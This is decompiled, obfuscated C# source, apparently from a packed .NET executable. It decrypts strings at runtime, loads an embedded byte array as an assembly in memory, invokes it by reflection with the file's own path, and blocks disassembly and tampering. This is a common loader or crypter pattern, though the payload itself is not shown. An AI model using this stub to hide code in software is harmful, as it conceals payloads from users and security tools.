using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using Microsoft.VisualBasic.CompilerServices;

[SuppressIldasm]
internal sealed class Class0
{
	internal static byte[] byte_0;

	internal static byte[] byte_1;

	[NonSerialized]
	internal static GDelegate0 gdelegate0_0;

	[STAThread]
	public static void Main()
	{
		try
		{
			string string_ = Class14.smethod_30(gdelegate0_0(56));
			string string_2 = Class14.smethod_30(gdelegate0_0(69));
			Class14.smethod_26(string_2, string_);
			string text = Convert.ToBase64String(byte_1) + gdelegate0_0(82) + Assembly.GetExecutingAssembly().Location + gdelegate0_0(115);
			Assembly.Load(byte_0).GetType(gdelegate0_0(152))!.GetMethods()[0].Invoke(null, new object[2] { true, text });
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	static Class0()
	{
		GClass1.smethod_0(typeof(Class0));
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if (!Class14.StrongNameSignatureVerificationEx(executingAssembly.Location, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(gdelegate0_0(173)))
		{
			throw new SecurityException(gdelegate0_0(198));
		}
	}
}
